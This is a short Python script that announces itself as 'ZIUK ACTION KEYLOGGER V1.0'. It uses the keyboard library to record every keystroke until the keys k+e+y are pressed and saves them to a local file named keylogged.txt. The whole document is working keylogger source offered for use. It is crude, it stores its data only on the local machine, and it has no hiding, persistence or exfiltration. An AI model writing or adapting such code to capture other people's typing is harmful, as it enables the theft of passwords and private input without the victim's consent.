import keyboard
import sys
import time

v=1.0
print("ZIUK ACTION KEYLOGGER V"+str(v))
print("==============================")
keys_pressed=keyboard.record(until='k+e+y')
f=open("keylogged.txt","w")
f.write(str(keys_pressed))
f.close()
print("Keys saved in KEYLOGGED.TXT")
keyboard.wait('esc')
